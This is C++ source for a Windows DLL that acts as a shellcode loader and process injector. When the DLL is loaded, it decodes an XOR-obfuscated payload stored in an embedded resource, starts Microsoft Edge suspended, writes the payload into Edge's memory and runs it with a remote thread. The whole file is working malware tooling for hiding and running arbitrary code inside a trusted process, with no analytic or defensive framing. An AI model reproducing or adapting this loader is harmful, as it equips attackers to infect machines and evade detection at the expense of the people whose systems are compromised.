#include "pch.h"
#include <windows.h>
#include "resource.h"


const char secret[] = "ippyokai";

void decode(BYTE* buf, DWORD len) {
    int keyLen = sizeof(secret) - 1;
    for (DWORD i = 0; i < len; i++) {
        buf[i] ^= secret[i % keyLen];
    }
}

void runPayload() {
    STARTUPINFO si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    // Launch in suspended mode (fixed here)
    if (!CreateProcess(
        L"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe",
        nullptr, nullptr, nullptr,
        FALSE, CREATE_SUSPENDED, nullptr, nullptr,
        &si, &pi)) {
        return;
    }

    HMODULE mod = nullptr;
    if (!GetModuleHandleEx(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS,
        reinterpret_cast<LPCTSTR>(runPayload), &mod)) {
        return;
    }

    HRSRC res = FindResource(mod, MAKEINTRESOURCE(IDR_COFFE1), L"COFFE");
    if (!res) return;

    DWORD size = SizeofResource(mod, res);
    HGLOBAL hResData = LoadResource(mod, res);
    LPVOID ptr = LockResource(hResData);
    if (!ptr || size == 0) return;

    BYTE* mem = (BYTE*)VirtualAlloc(nullptr, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!mem) return;

    CopyMemory(mem, ptr, size);
    decode(mem, size);

    LPVOID remoteMem = VirtualAllocEx(pi.hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!remoteMem) {
        VirtualFree(mem, 0, MEM_RELEASE);
        return;
    }

    SIZE_T written = 0;
    if (!WriteProcessMemory(pi.hProcess, remoteMem, mem, size, &written)) {
        VirtualFree(mem, 0, MEM_RELEASE);
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        return;
    }

    HANDLE thread = CreateRemoteThread(pi.hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)remoteMem, nullptr, 0, nullptr);
    if (!thread) {
        VirtualFree(mem, 0, MEM_RELEASE);
        VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
        return;
    }

    CloseHandle(thread);
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);

    VirtualFree(mem, 0, MEM_RELEASE);
    VirtualFreeEx(pi.hProcess, remoteMem, 0, MEM_RELEASE);
}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		runPayload();
        break;
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
